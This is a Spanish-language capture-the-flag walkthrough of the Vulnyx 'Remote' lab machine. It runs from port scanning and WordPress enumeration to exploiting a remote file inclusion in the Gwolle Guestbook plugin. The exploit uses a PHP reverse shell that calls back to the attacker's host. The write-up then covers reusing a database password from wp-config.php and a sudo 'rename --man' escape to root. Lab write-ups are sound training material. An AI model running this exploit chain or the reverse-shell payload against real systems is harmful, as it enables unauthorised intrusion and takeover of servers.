---
icon: flag
---

# Remote Vulnyx (Easy - Linux)

## Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-14 03:32 EDT
Nmap scan report for 192.168.5.78
Host is up (0.00051s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 f0:e6:24:fb:9e:b0:7a:1a:bd:f7:b1:85:23:7f:b1:6f (RSA)
|   256 99:c8:74:31:45:10:58:b0:ce:cc:63:b4:7a:82:57:3d (ECDSA)
|_  256 60:da:3e:31:38:fa:b5:49:ab:48:c3:43:2c:9f:d1:32 (ED25519)
80/tcp open  http    Apache httpd 2.4.56 ((Debian))
|_http-server-header: Apache/2.4.56 (Debian)
|_http-title: Apache2 Debian Default Page: It works
MAC Address: 08:00:27:C4:3B:78 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.66 seconds
```

Veremos el puerto `80` que aloja una pagina web, si entramos dentro veremos una pagina web normal de `apache`, por lo que vamos a realizar un poco de `fuzzing` a ver que encontramos.

## Gobuster

```shell
gobuster dir -u http://<IP>/ -w <WORDLISTS> -x html,php,txt -t 50 -k -r
```

Info:

```
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.5.78/
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,txt,html
[+] Follow Redirect:         true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 277]
/index.html           (Status: 200) [Size: 10701]
/.html                (Status: 403) [Size: 277]
Progress: 32892 / 882244 (3.73%)[ERROR] Get "http://192.168.5.78/wordpress/": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
/.php                 (Status: 403) [Size: 277]
/.html                (Status: 403) [Size: 277]
/server-status        (Status: 403) [Size: 277]
Progress: 645199 / 882244 (73.13%)^C
[!] Keyboard interrupt detected, terminating.
Progress: 645348 / 882244 (73.15%)
===============================================================
Finished
===============================================================
```

Vemos que nos ha dado un pequeño error en la parte de `wordpress`, vamos a probar esa ruta por si el error fuera por que no cargara el dominio con el que este establecido.

```
URL = http://<IP>/wordpress
```

Veremos que carga como un `wordpress` pero veremos que no carga muy bien, por lo que vamos a investigar por si fuera por un dominio que no esta cargando.

Si pasamos por un boton de la pagina veremos el dominio que esta intentando cargar llamado `remote.nyx`, vamos a meterlo en nuestro archivo `hosts` quedando asi.

```shell
nano /etc/hosts

#Dentro del nano

<IP>            remote.nyx
```

Ahora que lo hemos añadido al archivo vamos a volver a cargar la pagina, echo esto veremos un `wordpress` ya bien cargado, por lo que como sabemos que es un `wordpress` vamos a intentar enumerar los usuarios de dicha pagina.

## Escalate user www-data

### wpscan

```shell
wpscan --url http://<IP>/wordpress --enumerate u
```

Info:

```
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.28
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://192.168.5.78/wordpress/ [192.168.5.78]
[+] Started: Thu Aug 14 03:54:38 2025

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.56 (Debian)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://192.168.5.78/wordpress/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://192.168.5.78/wordpress/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://192.168.5.78/wordpress/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 6.3 identified (Insecure, released on 2023-08-08).
 | Found By: Emoji Settings (Passive Detection)
 |  - http://192.168.5.78/wordpress/, Match: 'wp-includes\/js\/wp-emoji-release.min.js?ver=6.3'
 | Confirmed By: Meta Generator (Passive Detection)
 |  - http://192.168.5.78/wordpress/, Match: 'WordPress 6.3'

[i] The main theme could not be detected.

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:00 <===============================================================================> (10 / 10) 100.00% Time: 00:00:00

[i] User(s) Identified:

[+] tiago
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Thu Aug 14 03:54:41 2025
[+] Requests Done: 48
[+] Cached Requests: 4
[+] Data Sent: 12.49 KB
[+] Data Received: 158.213 KB
[+] Memory used: 142.988 MB
[+] Elapsed time: 00:00:02
```

Veremos que nos ha descubierto un usuario llamado `tiago`, ahora vamos a intentar sacar la contraseña de dicho usuario a ver si lo conseguimos, pero no veremos gran cosa, por lo que vamos a enumerar `plugins` vulnerables a ver si vemos algo.

```shell
wpscan --url http://<IP>/wordpress -e vp --plugins-detection mixed
```

Info:

```
[i] Plugin(s) Identified:

[+] gwolle-gb
 | Location: http://remote.nyx/wordpress/wp-content/plugins/gwolle-gb/
 | Last Updated: 2025-06-23T16:09:00.000Z
 | Readme: http://remote.nyx/wordpress/wp-content/plugins/gwolle-gb/readme.txt
 | [!] The version is out of date, the latest version is 4.9.3
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://remote.nyx/wordpress/wp-content/plugins/gwolle-gb/, status: 200
 |
 | Version: 1.5.3 (100% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://remote.nyx/wordpress/wp-content/plugins/gwolle-gb/readme.txt
 | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
 |  - http://remote.nyx/wordpress/wp-content/plugins/gwolle-gb/readme.txt
```

Veremos que hay un `plugin` llamado `gwolle-gb` por lo que vamos a investigar que podemos hacer con el, su `PoC` a ver cual es.

Si vamos a `ExploitDB` veremos que esta en `PoC` subido llevando a una `URL` de un archivo vulnerable pudiendo realizar un `RCE`.

```
Advisory Details:

High-Tech Bridge Security Research Lab discovered a critical Remote File Inclusion (RFI) in Gwolle Guestbook WordPress plugin, which can be exploited by non-authenticated attacker to include remote PHP file and execute arbitrary code on the vulnerable system.  

HTTP GET parameter "abspath" is not being properly sanitized before being used in PHP require() function. A remote attacker can include a file named 'wp-load.php' from arbitrary remote server and execute its content on the vulnerable web server. In order to do so the attacker needs to place a malicious 'wp-load.php' file into his server document root and includes server's URL into request:

http://[host]/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://[hackers_website]

In order to exploit this vulnerability 'allow_url_include' shall be set to 1. Otherwise, attacker may still include local files and also execute arbitrary code. 

Successful exploitation of this vulnerability will lead to entire WordPress installation compromise, and may even lead to the entire web server compromise. 
```

Si nos abrimos un servidor de `python3` para comprobar que esto funcione...

```shell
python3 -m http.server 80
```

Ahora vamos a intentar ver si funciona.

```
URL = http://<IP>/wordpress/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://<IP_ATTACKER>/test
```

Info:

```
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
192.168.5.78 - - [14/Aug/2025 04:04:05] code 404, message File not found
192.168.5.78 - - [14/Aug/2025 04:04:05] "GET /testwp-load.php HTTP/1.0" 404 -
```

Veremos que esta funcionando y que esta intentando descargarlo, por lo que vamos a crear un archivo en `PHP` con una `reverse shell` a ver si conseguimos un acceso inicial.

> shell.php

```php
<?php
$sock=fsockopen("<IP>",<PORT>);$proc=proc_open("sh", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);
?>
```

Ahora vamos a ponernos a la escucha con `nc`.

```shell
nc -lvnp <PORT>
```

Ahora desde la `URL` vamos a realizar lo siguiente teniendo el servidor de `python3` abierto donde esta dicho archivo.

```
URL = http://<IP>/wordpress/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://<IP_ATTACKER>/shell.php
```

Si vamos al servidor de `python3` vemos que tenemos un error, esta poniendo un nombre de archivo por defecto la pagina llamado `wp-load.php` por lo que vamos a renombrar el archivo con dicho nombre y no indicarle nada en la `URL`.

```shell
mv shell.php wp-load.php
```

Ahora la `URL` la dejaremos de esta forma:

```
URL = http://<IP>/wordpress/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://<IP_ATTACKER>/
```

Ahora si volvemos a donde tenemos la escucha veremos lo siguiente:

```
listening on [any] 7777 ...
connect to [192.168.5.50] from (UNKNOWN) [192.168.5.78] 44816
whoami
www-data
```

Vemos que esta funcionando, por lo que vamos a sanitizar la `shell`.

### Sanitización de shell (TTY)

```shell
script /dev/null -c bash
```

```shell
# <Ctrl> + <z>
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=/bin/bash

# Para ver las dimensiones de nuestra consola en el Host
stty size

# Para redimensionar la consola ajustando los parametros adecuados
stty rows <ROWS> columns <COLUMNS>
```

## Escalate user tiago

Si leemos el archivo llamado `wp-config.php` que suele llevar credenciales podremos ver lo siguiente:

```shell
cat /usr/www/html/wordpress/wp-config.php
```

Info:

```
// ** Database settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( 'DB_NAME', 'wordpress' );

/** Database username */
define( 'DB_USER', 'root' );

/** Database password */
define( 'DB_PASSWORD', 'WPr00t3d123!' );

/** Database hostname */
define( 'DB_HOST', 'localhost' );

/** Database charset to use in creating database tables. */
define( 'DB_CHARSET', 'utf8mb4' );

/** The database collate type. Don't change this if in doubt. */
define( 'DB_COLLATE', '' );
```

Veremos una contraseña vamos a probarla con el usuario `tiago` que tenemos a nivel de sistema a ver si fuera reutilizada.

```shell
su tiago
```

Metemos como contraseña `WPr00t3d123!`...

Info:

```
tiago@remote:/var/www/html/wordpress$ whoami
tiago
```

Con esto veremos que estaremos dentro de forma exitosa, ahora vamos a leer la `flag` del usuario.

> user.txt

```
ede553d38ed011f766ecfeac8902a501
```

## Escalate Privileges

Si hacemos `sudo -l` veremos lo siguiente:

```
Matching Defaults entries for tiago on remote:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User tiago may run the following commands on remote:
    (root) NOPASSWD: /usr/bin/rename
```

Veremos que podemos ejecutar el binario `rename` como el usuario `root`, por lo que haremos lo siguiente:

Si leemos la ayuda con el `-h` veremos que de forma interna con el parametro `--man` se ejecute la ayuda de `man` de dicho binario, teniendo los privilegios elevados podremos invocar dentro una `shell` de esta forma.

```shell
sudo rename --man
!/bin/bash
```

Info:

```
root@remote:/home/tiago# whoami
root
```

Veremos que somos `root`, por lo que vamos a leer la `flag` de `root`.

> root.txt

```
5b002472cb520245906ed20804c6471a
```
